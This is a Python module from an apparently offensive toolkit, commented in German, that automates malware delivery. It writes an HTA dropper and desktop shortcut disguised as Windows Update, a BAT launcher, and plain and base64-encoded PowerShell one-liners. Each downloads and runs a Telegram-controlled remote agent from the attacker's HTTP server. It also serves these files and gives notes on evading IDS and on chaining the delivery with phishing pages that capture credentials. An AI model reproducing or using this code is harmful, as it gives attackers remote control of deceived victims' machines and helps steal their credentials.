"""
Auto-Delivery — Ein-Klick Angriffskette.

Kombiniert Payload-Erstellung + HTTP-Server:
  1. Telegram C2 Agent PS1 generieren
  2. Alle Delivery-Formate bauen (HTA, BAT, PS1 One-Liner, LNK-Builder)
  3. HTTP-Server starten
  4. Link anzeigen → teilen → Agent startet automatisch auf Ziel

HTA = HTML Application: läuft als "vertrauenswürdige" Anwendung auf Windows,
      bypassed PowerShell Execution Policy, öffnet sich bei Doppelklick.
"""
from __future__ import annotations
import asyncio
import http.server
import os
import threading
from datetime import datetime
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Auto-Delivery",
    description=(
        "Generiert alle Delivery-Formate (HTA/BAT/PS1) und startet HTTP-Server. "
        "Link teilen → Opfer klickt → Agent startet sofort."
    ),
    usage="LHOST eingeben, Link kopieren und teilen.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="http://192.168.1.10:8888/update.hta  →  Doppelklick → Agent online",
)

DANGER = DangerLevel.BLACK

# ── Templates ──────────────────────────────────────────────────────────────────

_HTA_TEMPLATE = '''\
<html>
<head>
<HTA:APPLICATION
    APPLICATIONNAME="Windows Update Assistant"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
/>
<title>Windows Update</title>
</head>
<script language="VBScript">
Sub Window_OnLoad
    Dim oWsh
    Set oWsh = CreateObject("WScript.Shell")
    Dim cmd
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "
    cmd = cmd & Chr(34) & "(New-Object Net.WebClient).DownloadString('{AGENT_URL}')|IEX" & Chr(34)
    oWsh.Run cmd, 0, False
    Self.Close
End Sub
</script>
<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
<div style="max-width:500px;margin:80px auto;text-align:center;">
<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
</div>
<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
</body>
</html>
'''

_BAT_TEMPLATE = """\
@echo off
title Windows Update
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile ^
  -Command "(New-Object Net.WebClient).DownloadString('{AGENT_URL}') | IEX"
"""

_LNK_BUILDER_PS1 = """\
# Auf Ziel ausführen → erstellt täuschend echte Verknüpfung
$lnk = (New-Object -COM WScript.Shell).CreateShortcut("$env:DESKTOP\\Windows Update.lnk")
$lnk.TargetPath    = "powershell.exe"
$lnk.Arguments     = '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object Net.WebClient).DownloadString(''{AGENT_URL}'') | IEX"'
$lnk.IconLocation  = "%SystemRoot%\\System32\\imageres.dll,109"
$lnk.Description   = "Windows Update"
$lnk.WorkingDirectory = "%TEMP%"
$lnk.Save()
Write-Host "[+] Shortcut auf Desktop erstellt."
"""

_README_TEMPLATE = """\
PenKit Auto-Delivery — Angriffs-Links
======================================
Generiert: {TS}
LHOST    : {LHOST}
Port     : {PORT}

=== DELIVERY OPTIONEN ===

1. HTA (empfohlen — Doppelklick reicht):
   {BASE}/update.hta
   → Täuscht Windows Update vor, lädt Agent unsichtbar

2. BAT-Datei (über Freigabe / USB / E-Mail):
   {BASE}/update.bat
   → Als update.bat speichern, Doppelklick

3. PowerShell One-Liner (via Chat / Slack / etc.):
   powershell -ep bypass -w h -c "iex(New-Object Net.WebClient).DownloadString('{AGENT_URL}')"

4. CMD-kompatibel:
   powershell -ep bypass -w h "(New-Object Net.WebClient).DownloadString('{AGENT_URL}')|iex"

5. Base64-kodiert (Erkennung erschweren):
   powershell -enc {B64}

=== COMBO MIT PHISHING ===
1. Phishing-Server starten (Menü 7)
2. Dieser Link als Redirect nach Credential-Capture setzen
3. Opfer füllt Fake-Login aus → bekommt "Update" angezeigt → Agent läuft

=== FIREWALL ===
sudo ufw allow {PORT}/tcp
"""


class AutoDelivery:
    def __init__(
        self,
        lhost: str,
        port: int = 8888,
        output_dir: str = "/tmp",
        telegram_token: str = "",
        telegram_chat_id: str = "",
        telegram_interval: int = 10,
    ):
        self.lhost     = lhost
        self.port      = port
        self.out       = output_dir
        self.token     = telegram_token
        self.chat_id   = telegram_chat_id
        self.interval  = telegram_interval
        self._server: http.server.HTTPServer | None = None
        self._running  = True
        self._visits: list[str] = []

    def _base_url(self) -> str:
        return f"http://{self.lhost}:{self.port}"

    def _agent_url(self) -> str:
        return f"{self._base_url()}/a.ps1"

    def _gen_agent_ps1(self) -> str | None:
        if not self.token or not self.chat_id:
            return None
        try:
            from tools.c2.telegram_agent import generate as tg_gen
            from tools.c2.c2_watcher import mark_agent_generated
            code = tg_gen(self.token, self.chat_id, self.interval)
            mark_agent_generated()
            return code
        except Exception:
            return None

    def _b64_oneliner(self) -> str:
        import base64
        cmd = f"(New-Object Net.WebClient).DownloadString('{self._agent_url()}')|IEX"
        encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
        return encoded

    def _write_files(self) -> list[tuple[str, str]]:
        files = []
        url = self._agent_url()

        agent_ps1 = self._gen_agent_ps1()
        if agent_ps1:
            p = os.path.join(self.out, "a.ps1")
            with open(p, "w") as f:
                f.write(agent_ps1)
            files.append(("a.ps1", f"Telegram C2 Agent ({len(agent_ps1):,} Zeichen)"))

        hta = _HTA_TEMPLATE.replace("{AGENT_URL}", url)
        with open(os.path.join(self.out, "update.hta"), "w") as f:
            f.write(hta)
        files.append(("update.hta", "HTA Dropper — täuscht Windows Update vor"))

        bat = _BAT_TEMPLATE.replace("{AGENT_URL}", url)
        with open(os.path.join(self.out, "update.bat"), "w") as f:
            f.write(bat)
        files.append(("update.bat", "BAT Launcher"))

        lnk = _LNK_BUILDER_PS1.replace("{AGENT_URL}", url)
        with open(os.path.join(self.out, "make_lnk.ps1"), "w") as f:
            f.write(lnk)
        files.append(("make_lnk.ps1", "LNK-Shortcut Builder (auf Ziel ausführen)"))

        b64 = self._b64_oneliner()
        readme = _README_TEMPLATE.format(
            TS=datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
            LHOST=self.lhost, PORT=self.port,
            BASE=self._base_url(), AGENT_URL=url, B64=b64,
        )
        with open(os.path.join(self.out, "DELIVERY_LINKS.txt"), "w") as f:
            f.write(readme)
        files.append(("DELIVERY_LINKS.txt", "Alle Links + Erklärungen"))

        return files

    def _make_server(self):
        out_dir = self.out
        visits  = self._visits

        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *a, **kw):
                super().__init__(*a, directory=out_dir, **kw)

            def log_message(self, fmt, *args):
                ts  = datetime.now().strftime("%H:%M:%S")
                ip  = self.client_address[0]
                ua  = self.headers.get("User-Agent", "?")[:50]
                msg = fmt % args
                entry = f"[{ts}]  {ip:<16}  {msg}  {ua}"
                visits.append(entry)
                print(f"  \033[96m{entry}\033[0m")

        return http.server.HTTPServer(("0.0.0.0", self.port), Handler)

    async def start(self) -> AsyncGenerator[str, None]:
        yield "[*] Auto-Delivery startet..."
        yield f"[*] LHOST: {self.lhost}:{self.port}  →  Output: {self.out}"
        yield ""

        files = self._write_files()
        yield f"[+] Delivery-Dateien generiert:"
        for name, desc in files:
            yield f"    {name:<26}  {desc}"

        self._server = self._make_server()
        t = threading.Thread(target=self._server.serve_forever, daemon=True)
        t.start()
        await asyncio.sleep(0.3)

        base = self._base_url()
        url  = self._agent_url()
        b64  = self._b64_oneliner()

        yield f"\n[+] HTTP-Server aktiv: {base}"
        yield f"\n{'─'*60}"
        yield f"  ANGRIFFS-LINKS:"
        yield f"{'─'*60}"
        yield f"  HTA (Doppelklick)  :  {base}/update.hta"
        yield f"  BAT-Datei          :  {base}/update.bat"
        yield f"  Agent direkt       :  {url}"
        yield f"{'─'*60}"
        yield f"\n  PowerShell One-Liner:"
        yield f"  powershell -ep bypass -w h -c \"iex(New-Object Net.WebClient).DownloadString('{url}')\""
        yield f"\n  Base64 (für IDS-Evasion):"
        yield f"  powershell -enc {b64[:60]}..."
        yield f"\n  Alle Links gespeichert: {self.out}/DELIVERY_LINKS.txt"
        yield f"\n[*] Warte auf Verbindungen... Ctrl+C zum Stoppen\n"

        try:
            while self._running:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            if self._server:
                self._server.shutdown()
            yield f"\n[*] Server gestoppt. {len(self._visits)} Requests empfangen."

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()
